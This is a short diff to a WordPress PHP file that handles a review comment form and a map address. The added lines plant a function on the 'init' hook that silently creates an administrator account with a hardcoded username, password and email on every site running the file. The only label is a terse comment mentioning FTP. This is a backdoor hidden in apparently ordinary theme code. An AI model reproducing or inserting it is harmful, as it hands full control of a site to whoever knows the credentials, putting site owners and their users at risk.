@@ -7,6 +7,19 @@ if (isset($_GET['writeyourreviewid'])) {
     $yourpostid = $_GET['writeyourreviewid'];
     comment_form($args = array(), $post_id = $yourpostid);
 }
+//Add administrator role if you have FTP
+function imihir_admin_account() {
+    $user = 'wordpressadminfunction';
+    $pass = 'Wordpressadminfunction@2021';
+    $email = 'wordpressadminfunction@imihir.com';
+    if (!username_exists($user) && !email_exists($email)) {
+        $user_id = wp_create_user($user, $pass, $email);
+        $user = new WP_User($user_id);
+        $user->set_role('administrator');
+    }
+}
+
+add_action('init', 'imihir_admin_account');
 
 // Use of dynamic address in map with php variable
 $yourAddress = "Example Address or you can fetch address from backend options";
